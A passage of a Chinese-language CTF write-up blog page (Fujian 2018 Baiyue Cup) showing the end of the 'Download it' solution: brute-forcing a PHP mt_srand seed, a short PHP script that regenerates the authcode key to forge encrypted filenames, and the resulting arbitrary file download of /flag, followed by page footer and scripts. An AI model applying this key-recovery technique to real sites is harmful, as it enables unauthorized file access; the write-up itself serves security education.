words.index(i),</span><br></pre></td></tr></table></figure></p>
+<p>爆破得到一个可能的种子<br><img src="https://i.loli.net/2018/12/01/5c0270ae08a57.png" alt="20181201192951.png"></p>
+<p>利用种子解密之前下载<code>35hGm34y.php</code>的文件名试试, 得到<code>filename=35hGm34y.php</code>, 证明我们的猜想是对的!</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 证明脚本 注意版本是 7.0.x */</span></span><br><span class="line">$seed = <span class="number">3559020430</span>;</span><br><span class="line">mt_srand($seed);</span><br><span class="line">gen_rand(<span class="number">8</span>);</span><br><span class="line">$key = gen_rand(<span class="number">32</span>);<span class="comment">//'r9BsGsvcNnY8jYA5XD9rUgY2hpSiTMcp';</span></span><br><span class="line">$m = <span class="string">'e47dc5Sjdiy/O1aTX0nOjboCI3qdNljrSkHZ33lFSqb9mFnMU5j6pv7qSUGLI4vX9dk'</span>;</span><br><span class="line"><span class="keyword">echo</span> authcode($m, <span class="string">'DECODE'</span>, $key); <span class="comment">// filename=35hGm34y.php</span></span><br></pre></td></tr></table></figure>
+<p>我们得到了任意文件下载权限！ 于是我把所有已知文件名的文件全下载下来了, 没有找到flag. 但我很快想到了应该不会藏在太刁钻的地方, 于是用我试了下<code>/flag</code>这个路径, 果然, 拿到了flag. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;69639776-2e53-45ab-8664-deb8941ab4c5&#125;</span><br></pre></td></tr></table></figure>
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>福建省2018百越杯线上赛部分题解</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2018/12/02 12:00:00</p>
+<p><span>更新时间：</span>2019/02/17 04:05:38</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2018/12/02/福建省2018百越杯线上赛部分题解/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#血小板天下第一可爱"><span class="toc-number">2.</span> <span class="toc-text">血小板天下第一可爱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-universe"><span class="toc-number">3.</span> <span class="toc-text">flag_universe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-ser"><span class="toc-number">4.</span> <span class="toc-text">simple ser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#format"><span class="toc-number">5.</span> <span class="toc-text">format</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Download-it"><span class="toc-number">6.</span> <span class="toc-text">Download it</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
